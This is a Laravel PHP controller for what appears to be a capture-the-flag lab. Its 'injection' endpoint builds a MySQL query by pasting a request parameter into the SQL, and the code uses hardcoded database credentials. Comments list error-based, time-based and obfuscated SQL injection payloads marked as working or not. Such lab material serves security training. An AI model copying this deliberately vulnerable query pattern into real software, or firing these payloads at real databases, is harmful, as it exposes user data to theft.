<?php

namespace App\Http\Controllers;
use Illuminate\Support\Facades\DB;
use Illuminate\Http\Request;

class CTFController extends Controller
{
    public function injection(Request $request)
    {
        // Your logic for handling the injection endpoint here
        // This is an intentionally vulnerable code path
        /** 
         * Example: 
         * basic : %') OR 1=1; --
         * 
         * Error-based SQL injection:
         * ' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1
         * 
         ** Time-based SQL injection:
         * ' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1 KO
         * 
        **/
        // Obfuscated payload: 
        // '/**/OR/**/'1'='1 OK
        // %2527%2BOR%2B%25271%2527%253D%25271 KO
        // %27%20%4f%52%20%27%31%27%3d%27%31 KO
        // ' AND BENCHMARK(5000000,ENCODE('test','test')) AND '1'='1  KO

        $servername = "localhost";
        $username = "laravel";
        $password = "laravel";
        $dbname = "soc";

        $conn = new \mysqli($servername, $username, $password, $dbname);

        if ($conn->connect_error) {
         die("Connection failed: " . $conn->connect_error);
        }

        $search = $request->search;
        $sql = "SELECT * FROM users WHERE nom = '$search';";
        //$sql = "SELECT * FROM users WHERE nom LIKE '%" . $search . "%';";

        $results = $conn->query($sql);
        $result = $results->fetch_assoc();


       

        $conn->close();
        // Return a JSON response
        return response()->json([
            'status' => 'success',
            'message' =>  $sql ,
            'data' => $result,
        ]);
    }
    
}


